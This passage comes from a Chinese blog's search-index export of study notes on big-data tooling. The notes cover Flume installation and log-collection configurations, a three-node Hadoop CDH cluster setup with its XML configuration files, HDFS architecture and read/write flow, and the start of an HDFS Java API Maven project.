启动脚本 sh /export/servers/shells/tail-file.sh tail -f access_log"},{"title":"","date":"2019-05-10T06:22:00.000Z","updated":"2022-05-12T03:25:00.000Z","comments":true,"path":"notes/Flume/deploy.html","permalink":"https://blog.mhuig.top/notes/Flume/deploy","excerpt":"","text":"安装部署 Flume 的安装部署 案例：使用网络 telent 命令向一台机器发送一些网络数据，然后通过 flume 采集网络端口数据 第一步：下载解压修改配置文件Flume 的安装非常简单，只需要解压即可，当然，前提是已有 hadoop 环境上传安装包到数据源所在节点上这里我们采用在第三台机器来进行安装 tar -zxvf flume-ng-1.6.0-cdh5.14.0.tar.gz -C /export/servers/cd /export/servers/apache-flume-1.6.0-cdh5.14.0-bin/confcp flume-env.sh.template flume-env.shvim flume-env.sh flume-env.shexport JAVA_HOME=/export/servers/jdk1.8.0_141 第二步：开发配置文件根据数据采集的需求配置采集方案，描述在配置文件中 (文件名可任意自定义)配置我们的网络收集的配置文件在 flume 的 conf 目录下新建一个配置文件（采集方案） vim /export/servers/apache-flume-1.6.0-cdh5.14.0-bin/conf/netcat-logger.conf netcat-logger.conf# agent namea1.sources = r1a1.sinks = k1a1.channels = c1# desc source:r1a1.sources.r1.type = netcata1.sources.r1.bind = 192.168.52.120a1.sources.r1.port = 44444# desc sink:k1a1.sinks.k1.type = logger# desc channela1.channels.c1.type = memorya1.channels.c1.capacity = 1000a1.channels.c1.transactionCapacity = 100# desc source channel sinka1.sources.r1.channels = c1a1.sinks.k1.channel = c1 第三步：启动配置文件指定采集方案配置文件，在相应的节点上启动 flume agent先用一个最简单的例子来测试一下程序环境是否正常启动 agent 去采集数据 bin/flume-ng agent -c conf -f conf/netcat-logger.conf -n a1 -Dflume.root.logger=INFO,console -c conf 指定 flume 自身的配置文件所在目录-f conf/netcat-logger.con 指定我们所描述的采集方案-n a1 指定我们这个 agent 的名字 第四步：安装 telent 准备测试在 node02 机器上面安装 telnet 客户端，用于模拟数据的发送 yum -y install telnettelnet node03 44444 # 使用 telnet 模拟数据发送 更多 source 和 sink 组件Flume 支持众多的 source 和 sink 类型，详细在官方文档http://archive.cloudera.com/cdh5/cdh/5/flume-ng-1.6.0-cdh5.14.0/FlumeUserGuide.html"},{"title":"","date":"2022-05-10T06:21:00.000Z","updated":"2022-05-10T06:21:00.000Z","comments":true,"path":"notes/Flume/index.html","permalink":"https://blog.mhuig.top/notes/Flume/","excerpt":"","text":".fa-secondary{opacity:.4} Flume Flume .prev-next{ display: none !important; }"},{"title":"","date":"2019-05-10T06:21:00.000Z","updated":"2022-05-12T03:15:00.000Z","comments":true,"path":"notes/Flume/overview.html","permalink":"https://blog.mhuig.top/notes/Flume/overview","excerpt":"","text":"Overview Flume 介绍 在一个完整的离线大数据处理系统中，除了 hdfs + mapreduce + hive 组成分析系统的核心之外，还需要数据采集、结果数据导出、任务调度等不可或缺的辅助系统，而这些辅助工具在 hadoop 生态体系中都有便捷的开源框架 日志采集框架 FlumeFlume 是一个分布式、可靠、和高可用的海量日志采集、聚合和传输的系统。 Flume 可以采集文件，socket 数据包、文件、文件夹、kafka 等各种形式源数据，又可以将采集到的数据 (下沉 sink) 输出到 HDFS、hbase、hive、kafka 等众多外部存储系统中 一般的采集需求，通过对 flume 的简单配置即可实现 Flume 针对特殊场景也具备良好的自定义扩展能力，因此，flume 可以适用于大部分的日常数据采集场景 运行机制1、 Flume 分布式系统中最核心的角色是 agent，flume 采集系统就是由一个个 agent 所连接起来形成2、每一个 agent 相当于一个数据传递员，内部有三个组件： a) Source：采集组件，用于跟数据源对接，以获取数据 b) Sink：下沉组件，用于往下一级 agent 传递数据或者往最终存储系统传递数据 c) Channel：传输通道组件，用于从 source 将数据传递到 sink Flume 采集系统结构图简单结构单个 agent 采集数据 复杂结构多级 agent 之间串联"},{"title":"","date":"2019-05-10T06:23:00.000Z","updated":"2022-05-12T03:34:00.000Z","comments":true,"path":"notes/Flume/spooldir.html","permalink":"https://blog.mhuig.top/notes/Flume/spooldir","excerpt":"","text":"监控目录变化 Flume 监控目录变化 需求分析采集需求：某服务器的某特定目录下，会不断产生新的文件，每当有新文件出现，就需要把文件采集到 HDFS 中去 根据需求，首先定义以下 3 大要素数据源组件，即 source —— 监控文件目录 : spooldir下沉组件，即 sink —— HDFS 文件系统 : hdfs sink通道组件，即 channel —— 可用 file channel 也可以用内存 channel spooldir 特性： 1、监视一个目录，只要目录中出现新文件，就会采集文件中的内容 2、采集完成的文件，会被 agent 自动添加一个后缀：COMPLETED 3、所监视的目录中不允许重复出现相同文件名的文件 flume 配置文件开发cd /export/servers/apache-flume-1.6.0-cdh5.14.0-bin/confmkdir -p /export/servers/dirfilevim spooldir.conf spooldir.conf# Name the components on this agenta1.sources = r1a1.sinks = k1a1.channels = c1# Describe/configure the source##name is only onea1.sources.r1.type = spooldira1.sources.r1.spoolDir = /export/servers/dirfilea1.sources.r1.fileHeader = true# Describe the sinka1.sinks.k1.type = hdfsa1.sinks.k1.channel = c1a1.sinks.k1.hdfs.path =hdfs://node01:8020/spooldir/files/%y-%m-%d/%H%M/a1.sinks.k1.hdfs.filePrefix = eventsa1.sinks.k1.hdfs.round = truea1.sinks.k1.hdfs.roundValue = 10a1.sinks.k1.hdfs.roundUnit = minutea1.sinks.k1.hdfs.rollInterval = 3a1.sinks.k1.hdfs.rollSize = 20a1.sinks.k1.hdfs.rollCount = 5a1.sinks.k1.hdfs.batchSize = 1a1.sinks.k1.hdfs.useLocalTimeStamp = true#gen filestyle,default Sequencefile,use DataStream texta1.sinks.k1.hdfs.fileType = DataStream# Use a channel which buffers events in memorya1.channels.c1.type = memorya1.channels.c1.capacity = 1000a1.channels.c1.transactionCapacity = 100# Bind the source and sink to the channela1.sources.r1.channels = c1a1.sinks.k1.channel = c1 Channel 参数解释：capacity：默认该通道中最大的可以存储的 event 数量trasactionCapacity：每次最大可以从 source 中拿到或者送到 sink 中的 event 数量keep-alive：event 添加到通道中或者移出的允许时间 启动 flumebin/flume-ng agent -c ./conf -f ./conf/spooldir.conf -n a1 -Dflume.root.logger=INFO,console 上传文件到指定目录将不同的文件上传到下面目录里面去，注意文件不能重名 cd /export/servers/dirfile"},{"title":"","date":"2019-05-10T06:24:00.000Z","updated":"2022-05-12T03:41:00.000Z","comments":true,"path":"notes/Flume/tail-file.html","permalink":"https://blog.mhuig.top/notes/Flume/tail-file","excerpt":"","text":"监控文件变化 Flume 监控文件变化 需求分析采集需求：比如业务系统使用 log4j 生成的日志，日志内容不断增加，需要把追加到日志文件中的数据实时采集到 hdfs 根据需求，首先定义以下 3 大要素 采集源，即 source—— 监控文件内容更新 : exec 'tail -F file' 下沉目标，即 sink——HDFS 文件系统 : hdfs sink Source 和 sink 之间的传递通道 ——channel，可用 file channel 也可以用 内存 channel 定义 flume 的配置文件node03 开发配置文件 cd /export/servers/apache-flume-1.6.0-cdh5.14.0-bin/confvim tail-file.conf tail-file.confagent1.sources = source1agent1.sinks = sink1agent1.channels = channel1# Describe/configure tail -F source1agent1.sources.source1.type = execagent1.sources.source1.command = tail -F /export/servers/taillogs/access_logagent1.sources.source1.channels = channel1#configure host for source#agent1.sources.source1.interceptors = i1#agent1.sources.source1.interceptors.i1.type = host#agent1.sources.source1.interceptors.i1.hostHeader = hostname# Describe sink1agent1.sinks.sink1.type = hdfs#agent1.sinks.sink1.channel = channel1agent1.sinks.sink1.hdfs.path = hdfs://192.168.52.100:8020/weblog/flumecollection/%y-%m-%d/%H-%Magent1.sinks.sink1.hdfs.filePrefix = access_logagent1.sinks.sink1.hdfs.maxOpenFiles = 5000agent1.sinks.sink1.hdfs.batchSize= 100agent1.sinks.sink1.hdfs.fileType = DataStreamagent1.sinks.sink1.hdfs.writeFormat =Textagent1.sinks.sink1.hdfs.rollSize = 102400agent1.sinks.sink1.hdfs.rollCount = 1000000agent1.sinks.sink1.hdfs.rollInterval = 60agent1.sinks.sink1.hdfs.round = trueagent1.sinks.sink1.hdfs.roundValue = 10agent1.sinks.sink1.hdfs.roundUnit = minuteagent1.sinks.sink1.hdfs.useLocalTimeStamp = true# Use a channel which buffers events in memoryagent1.channels.channel1.type = memoryagent1.channels.channel1.keep-alive = 120agent1.channels.channel1.capacity = 500000agent1.channels.channel1.transactionCapacity = 600# Bind the source and sink to the channelagent1.sources.source1.channels = channel1agent1.sinks.sink1.channel = channel1 创建文件夹mkdir -p /export/servers/taillogs 启动 flumecd /export/servers/apache-flume-1.6.0-cdh5.14.0-binbin/flume-ng agent -c conf -f conf/tail-file.conf -n agent1 -Dflume.root.logger=INFO,console 开发 shell 脚本定时追加文件内容mkdir -p /export/servers/shells/cd /export/servers/shells/vim tail-file.sh tail-file.sh#!/bin/bashwhile truedo date &gt;&gt; /export/servers/taillogs/access_log; sleep 0.5;done 启动脚本sh /export/servers/shells/tail-file.shtail -f access_log"},{"title":"","date":"2019-09-19T08:37:00.000Z","updated":"2022-05-11T08:17:00.000Z","comments":true,"path":"notes/Hadoop/cdh.html","permalink":"https://blog.mhuig.top/notes/Hadoop/cdh","excerpt":"","text":"CDH 伪分布式 大数据处理技术 - CDH 伪分布式环境搭建 CDH 伪分布式环境搭建（适用于学习测试开发集群模式） 集群运行服务规划 服务器 IP 192.168.52.100 192.168.52.110 192.168.52.120 HDFS NameNode Secondary NameNode DataNode DataNode DataNode YARN ResourceManager NodeManager NodeManager NodeManager MapReduce JobHistoryServer cdh 所有软件下载地址：http://archive.cloudera.com/cdh5/cdh/5/ 上传压缩包并解压将我们重新编译之后支持 snappy 压缩的 hadoop 包上传到第一台服务器并解压第一台机器执行以下命令 cd /export/softwares/ mv hadoop-2.6.0-cdh5.14.0-compile.tar.gz hadoop-2.6.0-cdh5.14.0.tar.gz tar -zxvf hadoop-2.6.0-cdh5.14.0.tar.gz -C ../servers/ 查看 hadoop 支持的压缩方式以及本地库第一台机器执行以下命令 cd /export/servers/hadoop-2.6.0-cdh5.14.0bin/hadoop checknative 如果出现 openssl（安全通信）为 false，那么所有机器在线安装 openssl 即可，执行以下命令，虚拟机联网之后就可以在线进行安装了 yum -y install openssl-devel 修改配置文件修改 core-site.xml第一台机器执行以下命令 cd /export/servers/hadoop-2.6.0-cdh5.14.0/etc/hadoopvim core-site.xml core-site.xml&lt;configuration&gt; &lt;property&gt; &lt;name&gt;fs.defaultFS&lt;/name&gt; &lt;value&gt;hdfs://node01:8020&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;hadoop.tmp.dir&lt;/name&gt; &lt;value&gt;/export/servers/hadoop-2.6.0-cdh5.14.0/hadoopDatas/tempDatas&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;io.file.buffer.size&lt;/name&gt; &lt;value&gt;4096&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;fs.trash.interval&lt;/name&gt; &lt;value&gt;10080&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; 修改 hdfs-site.xml第一台机器执行以下命令 cd /export/servers/hadoop-2.6.0-cdh5.14.0/etc/hadoopvim hdfs-site.xml hdfs-site.xml&lt;configuration&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.secondary.http-address&lt;/name&gt; &lt;value&gt;node01:50090&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.http-address&lt;/name&gt; &lt;value&gt;node01:50070&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.name.dir&lt;/name&gt; &lt;value&gt;file:///export/servers/hadoop-2.6.0-cdh5.14.0/hadoopDatas/namenodeDatas&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.datanode.data.dir&lt;/name&gt; &lt;value&gt;file:///export/servers/hadoop-2.6.0-cdh5.14.0/hadoopDatas/datanodeDatas&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.edits.dir&lt;/name&gt; &lt;value&gt;file:///export/servers/hadoop-2.6.0-cdh5.14.0/hadoopDatas/dfs/nn/edits&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.checkpoint.dir&lt;/name&gt; &lt;value&gt;file:///export/servers/hadoop-2.6.0-cdh5.14.0/hadoopDatas/dfs/snn/name&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.checkpoint.edits.dir&lt;/name&gt; &lt;value&gt;file:///export/servers/hadoop-2.6.0-cdh5.14.0/hadoopDatas/dfs/nn/snn/edits&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.replication&lt;/name&gt; &lt;value&gt;3&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.permissions&lt;/name&gt; &lt;value&gt;false&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.blocksize&lt;/name&gt; &lt;value&gt;134217728&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; 修改 hadoop-env.sh第一台机器执行以下命令 cd /export/servers/hadoop-2.6.0-cdh5.14.0/etc/hadoopvim hadoop-env.sh hadoop-env.shexport JAVA_HOME=/export/servers/jdk1.8.0_141 修改 mapred-site.xml第一台机器执行以下命令 cd /export/servers/hadoop-2.6.0-cdh5.14.0/etc/hadoopvim mapred-site.xml mapred-site.xml&lt;configuration&gt; &lt;property&gt; &lt;name&gt;mapreduce.framework.name&lt;/name&gt; &lt;value&gt;yarn&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;mapreduce.job.ubertask.enable&lt;/name&gt; &lt;value&gt;true&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;mapreduce.jobhistory.address&lt;/name&gt; &lt;value&gt;node01:10020&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;mapreduce.jobhistory.webapp.address&lt;/name&gt; &lt;value&gt;node01:19888&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; 修改 yarn-site.xml第一台机器执行以下命令 cd /export/servers/hadoop-2.6.0-cdh5.14.0/etc/hadoopvim yarn-site.xml yarn-site.xml&lt;configuration&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.hostname&lt;/name&gt; &lt;value&gt;node01&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;yarn.nodemanager.aux-services&lt;/name&gt; &lt;value&gt;mapreduce_shuffle&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;yarn.log-aggregation-enable&lt;/name&gt; &lt;value&gt;true&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;yarn.log-aggregation.retain-seconds&lt;/name&gt; &lt;value&gt;604800&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; 修改 slaves 文件第一台机器执行以下命令 cd /export/servers/hadoop-2.6.0-cdh5.14.0/etc/hadoopvim slaves slavesnode01node02node03 创建文件存放目录第一台机器执行以下命令node01 机器上面创建以下目录 mkdir -p /export/servers/hadoop-2.6.0-cdh5.14.0/hadoopDatas/tempDatasmkdir -p /export/servers/hadoop-2.6.0-cdh5.14.0/hadoopDatas/namenodeDatasmkdir -p /export/servers/hadoop-2.6.0-cdh5.14.0/hadoopDatas/datanodeDatasmkdir -p /export/servers/hadoop-2.6.0-cdh5.14.0/hadoopDatas/dfs/nn/editsmkdir -p /export/servers/hadoop-2.6.0-cdh5.14.0/hadoopDatas/dfs/snn/namemkdir -p /export/servers/hadoop-2.6.0-cdh5.14.0/hadoopDatas/dfs/nn/snn/edits 安装包的分发第一台机器执行以下命令 cd /export/servers/scp -r hadoop-2.6.0-cdh5.14.0/ node02:$PWDscp -r hadoop-2.6.0-cdh5.14.0/ node03:$PWD 配置 hadoop 的环境变量三台机器都要进行配置 hadoop 的环境变量三台机器执行以下命令 vim /etc/profile /etc/profileexport HADOOP_HOME=/export/servers/hadoop-2.6.0-cdh5.14.0export PATH=:$HADOOP_HOME/bin:$HADOOP_HOME/sbin:$PATH 配置完成之后生效 source /etc/profile 集群启动要启动 Hadoop 集群，需要启动 HDFS 和 YARN 两个集群。注意：首次启动 HDFS 时，必须对其进行格式化操作。本质上是一些清理和准备工作，因为此时的 HDFS 在物理上还是不存在的。 bin/hdfs namenode -format 脚本一键启动如果配置了 etc/hadoop/slaves 和 ssh 免密登录，则可以使用程序脚本启动所有 Hadoop 两个集群的相关进程，在主节点所设定的机器上执行。启动集群node01 节点上执行以下命令第一台机器执行以下命令 cd /export/servers/hadoop-2.6.0-cdh5.14.0/sbin/start-dfs.shsbin/start-yarn.shsbin/mr-jobhistory-daemon.sh start historyserver 停止集群 没事儿不要去停止集群 sbin/stop-dfs.shsbin/stop-yarn.shsbin/mr-jobhistory-daemon.sh stop historyserver 浏览器查看启动页面hdfs 集群访问地址http://192.168.52.100:50070/dfshealth.html#tab-overview yarn 集群访问地址http://192.168.52.100:8088/cluster jobhistory 访问地址：http://192.168.52.100:19888/jobhistory"},{"title":"","date":"2019-09-19T08:34:00.000Z","updated":"2022-05-11T02:15:00.000Z","comments":true,"path":"notes/Hadoop/first-experience.html","permalink":"https://blog.mhuig.top/notes/Hadoop/first-experience","excerpt":"","text":"Hadoop 集群初体验 大数据处理技术 - Hadoop 集群初体验 HDFS 使用体验从 Linux 本地上传一个文本文件到 hdfs 的 /test/input 目录下递归的创建文件夹： hdfs dfs -mkdir -p /test/inputhdfs dfs -ls / 分布式文件系统来源于本地磁盘 hdfs dfs -put /root/install.log /test/input MapReduce 程序初体验在 Hadoop 安装包的 hadoop-2.6.0-cdh5.14.0/share/hadoop/mapreduce 下 有 官 方 自 带 的 MapReduce 程序。我们可以使用如下的命令进行运行测试。示例程序 jar: hadoop-mapreduce-examples-2.6.0-cdh5.14.0.jar 计算圆周率: hadoop jar /export/servers/hadoop-2.6.0-cdh5.14.0/share/hadoop/mapreduce/hadoop-mapreduce-examples-2.6.0-cdh5.14.0.jar pi 2 5 关于圆周率的估算，感兴趣的可以查询资料 Monte Carlo 方法来计算 Pi 值。 底层日志线程异常，不用管！"},{"title":"","date":"2019-09-19T08:36:00.000Z","updated":"2022-05-11T02:50:00.000Z","comments":true,"path":"notes/Hadoop/hdfs-arch.html","permalink":"https://blog.mhuig.top/notes/Hadoop/hdfs-arch","excerpt":"","text":"HDFS 架构 大数据处理技术 - HDFS 的架构 基础架构 1、 NameNode 是一个中心服务器，单一节点（简化系统的设计和实现），负责管理文件系统的名字空间 namespace 以及客户端对文件的访问2、 文件操作，namenode 是负责文件元数据的操作，datanode 负责处理文件内容的读写请求，跟文件内容相关的数据流不经过 Namenode，只询问它跟哪个 dataNode 联系，否则 NameNode 会成为系统的瓶颈3、 副本存放在哪些 Datanode 上由 NameNode 来控制，根据全局情况作出块放置决定，读取文件时 NameNode 尽量让用户先读取最近的副本（网络拓扑图），降低读取网络开销和读取延时4、 NameNode 全权管理数据库的复制（永远保证有三个副本），它周期性的从集群中的每个 DataNode 接收心跳信合和状态报告，接收到心跳信号意味着 DataNode 节点工作正常，块状态报告包含了一个该 DataNode 上所有的数据列表 NameNode 与 Datanode 的总结概述 NameNode Datanode 存储元数据 存储文件内容 元数据存储在 内存中 文件内容存储在硬盘上 保存文件、block、DataNode 之间的映射关系 维护了 block id 到 DataNode 本地文件之间的映射关系 文件划了几个 block 块，存在那些个 DataNode 上 文件的文件副本机制以及 block 块存储 所有的文件都是以 block 块的方式存放在 HDFS 文件系统当中，在 hadoop1 当中，文件的 block 块默认大小是 64M，hadoop2 当中，文件的 block 块大小默认是 128M，block 块的大小可以通过 hdfs-site.xml 当中的配置文件进行指定 &lt;property&gt; &lt;name&gt;dfs.block.size&lt;/name&gt; &lt;value&gt;块大小 以字节为单位&lt;/value&gt; &lt;!-- 只写数值就可以 --&gt;&lt;/property&gt; 元数据信息 FSimage 以及 edits 和 secondaryNN 的作用在 hadoop 当中，使用如下架构的时候 也就是 namenode 就一个的时候，所有的元数据信息都保存在了 FsImage 与 Eidts 文件当中，这两个文件就记录了所有的数据的元数据信息，元数据信息的保存目录配置在了 hdfs-site.xml 当中 &lt;property&gt; &lt;name&gt;dfs.namenode.name.dir&lt;/name&gt; &lt;value&gt;file:///export/servers/hadoop-2.6.0-cdh5.14.0/hadoopDatas/namenodeDatas&lt;/value&gt;&lt;/property&gt;&lt;property&gt; &lt;name&gt;dfs.namenode.edits.dir&lt;/name&gt; &lt;value&gt;file:///export/servers/hadoop-2.6.0-cdh5.14.0/hadoopDatas/dfs/nn/edits&lt;/value&gt;&lt;/property&gt; FSImage 与 edits 详解客户端对 hdfs 进行写文件时会首先被记录在 edits 文件中。edits 修改时元数据也会更新。每次 hdfs 更新时 edits 先更新后客户端才会看到最新信息。 fsimage:是 namenode 中关于元数据的镜像，一般称为检查点。 一般开始时对 namenode 的操作都放在 edits 中，为什么不放在 fsimage 中呢？因为 fsimage 是 namenode 的完整的镜像，内容很大，如果每次都加载到内存的话生成树状拓扑结构，这是非常耗内存和 CPU。 fsimage 内容包含了 namenode 管理下的所有 datanode 中文件及文件 block 及 block 所在的 datanode 的元数据信息。随着 edits 内容增大，就需要在一定时间点和 fsimage 合并。 合并过程见 SecondaryNameNode 如何辅助管理 FSImage 与 edits FSimage 文件当中的文件信息查看官方查看文档https://hadoop.apache.org/docs/r2.6.0/hadoop-project-dist/hadoop-hdfs/HdfsImageViewer.html 使用命令 hdfs oiv cd /export/servers/hadoop-2.6.0-cdh5.14.0/hadoopDatas/namenodeDatas/currenthdfs oiv -i fsimage_0000000000000000150 -p XML -o qlg.xml （md5 校验文件，不是真正文件） edits 当中的文件信息查看官方查看文档https://hadoop.apache.org/docs/r2.6.0/hadoop-project-dist/hadoop-hdfs/HdfsEditsViewer.html 查看命令 hdfs oev cd /export/servers/hadoop-2.6.0-cdh5.14.0/hadoopDatas/dfs/nn/editshdfs oev -i edits_inprogress_0000000000000000001 -o slg.xml -p XML secondarynameNode 如何辅助管理 FSImage 与 Edits 文件 1: secnonaryNN 通知 NameNode 切换 editlog 2: secondaryNN 从 NameNode 中获得 FSImage 和 editlog (通过 http 方式) 3: secondaryNN 将 FSImage 载入内存，然后开始合并 editlog，合并之后成为新的 fsimage 4: secondaryNN 将新的 fsimage 发回给 NameNode 5: NameNode 用新的 fsimage 替换旧的 fsimage 完成合并的是 secondarynamenode，会请求 namenode 停止使用 edits, 暂时将新写操作放入一个新的文件中 edits.new。secondarynamenode 从 namenode 中通过 http get 获得 edits，因为要和 fsimage 合并，所以也是通过 http get 的方式把 fsimage 加载到内存，然后逐一执行具体对文件系统的操作，与 fsimage 合并，生成新的 fsimage，然后把 fsimage 发送给 namenode，通过 http post 的方式。namenode 从 secondarynamenode 获得了 fsimage 后会把原有的 fsimage 替换为新的 fsimage, 把 edits.new 变成 edits。同时会更新 fstime。hadoop 进入安全模式时需要管理员使用 dfsadmin 的 save namespace 来创建新的检查点。secondarynamenode 在合并 edits 和 fsimage 时需要消耗的内存和 namenode 差不多，所以一般把 namenode 和 secondarynamenode 放在不同的机器上。fs.checkpoint.period: 默认是一个小时（3600s)fs.checkpoint.size: edits 达到一定大小时也会触发合并（默认 64MB) HDFS 的文件写入过程 详细步骤解析： 1、 client 发起文件上传请求，通过 RPC 与 NameNode 建立通讯，NameNode 检查目标文件是否已存在，父目录是否存在，返回是否可以上传； 2、 client 请求第一个 block 该传输到哪些 DataNode 服务器上； 3、 NameNode 根据配置文件中指定的备份数量及机架感知原理进行文件分配，返回可用的 DataNode 的地址如：A，B，C；注：Hadoop 在设计时考虑到数据的安全与高效，数据文件默认在 HDFS 上存放三份，存储策略为本地一份，同机架内其它某一节点上一份，不同机架的某一节点上一份。 4、 client 请求 3 台 DataNode 中的一台 A 上传数据（本质上是一个 RPC 调用，建立 pipeline），A 收到请求会继续调用 B，然后 B 调用 C，将整个 pipeline 建立完成，后逐级返回 client； 5、 client 开始往 A 上传第一个 block（先从磁盘读取数据放到一个本地内存缓存），以 packet 为单位（默认 64K），A 收到一个 packet 就会传给 B，B 传给 C；A 每传一个 packet 会放入一个应答队列等待应答。 6、 数据被分割成一个个 packet 数据包在 pipeline 上依次传输，在 pipeline 反方向上，逐个发送 ack（命令正确应答），最终由 pipeline 中第一个 DataNode 节点 A 将 pipelineack 发送给 client; 7、 当一个 block 传输完成之后，client 再次请求 NameNode 上传第二个 block 到服务器。 HDFS 的文件读取过程 详细步骤解析 1、 Client 向 NameNode 发起 RPC 请求，来确定请求文件 block 所在的位置； 2、NameNode 会视情况返回文件的部分或者全部 block 列表，对于每个 block，NameNode 都会返回含有该 block 副本的 DataNode 地址； 这些返回的 DN 地址，会按照集群拓扑结构得出 DataNode 与客户端的距离，然后进行排序，排序两个规则：网络拓扑结构中距离 Client 近的排靠前；心跳机制中超时汇报的 DN 状态为 TALE，这样的排靠后； 3、 Client 选取排序靠前的 DataNode 来读取 block，如果客户端本身就是 DataNode, 那么将从本地直接获取数据 (短路读取特性)； 4、 底层上本质是建立 Socket Stream（FSDataInputStream），重复的调用父类 DataInputStream 的 read 方法，直到这个块上的数据读取完毕； 5、 当读完列表的 block 后，若文件读取还没有结束，客户端会继续向 NameNode 获取下一批的 block 列表； 6、 读取完一个 block 都会进行 checksum 验证，如果读取 DataNode 时出现错误，客户端会通知 NameNode，然后再从下一个拥有该 block 副本的 DataNode 继续读。 7、 read 方法是并行的读取 block 信息，不是一块一块的读取；NameNode 只是返回 Client 请求包含块的 DataNode 地址，并不是返回请求块的数据； 8、 最终读取来所有的 block 会合并成一个完整的最终文件。"},{"title":"","date":"2019-09-19T08:37:00.000Z","updated":"2022-05-11T12:24:00.000Z","comments":true,"path":"notes/Hadoop/hdfs-java.html","permalink":"https://blog.mhuig.top/notes/Hadoop/hdfs-java","excerpt":"","text":"HDFS JavaAPI 大数据处理技术 - HDFS 的 JavaAPI 操作 创建 maven 工程并导入 jar 包由于 cdh 版本的所有的软件涉及版权的问题，所以并没有将所有的 jar 包托管到 maven 仓库当中去，而是托管在了 CDH 自己的服务器上面，所以我们默认去 maven 的仓库下载不到，需要自己手动的添加 repository 去 CDH 仓库进行下载，以下两个地址是官方文档说明，请仔细查查阅https://www.cloudera.com/documentation/enterprise/releasenotes/topics/cdh_vd_cdh5_maven_repo.htmlhttps://www.cloudera.com/documentation/enterprise/releasenotes/topics/cdh_vd_cdh5_maven_repo_514x.html &lt;repositories&gt; &lt;repository&gt; &lt;id&gt;cloudera&lt;/id&gt; &lt;url&gt;https://repository.cloudera.com/artifactory/cloudera-repos/&lt;/url&gt; &lt;/repository&gt;&lt;/repositories&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.hadoop&lt;/groupId&gt; &lt;artifactId&gt;hadoop-client&lt;/artifactId&gt; &lt;version&gt;2.6.0-mr1-cdh5.14.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.hadoop&lt;/groupId&gt; &lt;artifactId&gt;hadoop-common&lt;/artifactId&gt; &lt;version&gt;2.6.0-cdh5.14.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.hadoop&lt;/groupId&gt; &lt;artifactId&gt;hadoop-hdfs&lt;/artifactId&gt; &lt;version&gt;2.6.0-cdh5.14.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.hadoop&lt;/groupId&gt; &lt;artifactId&gt;hadoop-mapreduce-client-core&lt;/artifactId&gt; &lt;version&gt;2.6.0-cdh5.14.0&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/junit/junit --&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.11&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.testng&lt;/groupId&gt; &lt;artifactId&gt;testng&lt;/artifactId&gt; &lt;version&gt;RELEASE&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt;&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;version&gt;3.0&lt;/version&gt; &lt;configuration&gt; &lt;source&gt;1.8&lt;/source&gt; &lt;target&gt;1.8&lt;/target&gt; &lt;encoding&gt;UTF-8&lt;/encoding&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-shade-plugin&lt;/artifactId&gt; &lt;version&gt;2.4.3&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;phase&gt;package&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;shade&lt;/goal&gt; &lt;/goals&gt; &lt;configuration&gt; &lt;minimizeJar&gt;true&lt;/minimizeJar&gt; &lt;/configuration&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; 使用文件系统方式访问数据在 java 中操作 HDFS，主要涉及以下 Class：Configuration：该类的对象封转了客户端或者服务器的配置;FileSystem（抽象类）：该类的对象是一个文件系统对象，可以用该对象的一些方法来对文件进行操作，通过 FileSystem 的静态方法 get 获得该对象。 FileSystem fs = FileSystem.get(conf) get 方法从 conf 中的一个参数 fs.defaultFS 的配置值判断具体是什么类型的文件系统。如果我们的代码中没有指定 fs.defaultFS，并且工程 classpath 下也没有给定相应的配置，conf 中的默认值就来自于 hadoop 的 jar 包中的 coredefault.xml ， 默认值为: file:/// ， 则获取的将不是一个DistributedFileSystem 的实例，而是一个本地文件系统的客户端对象 获取 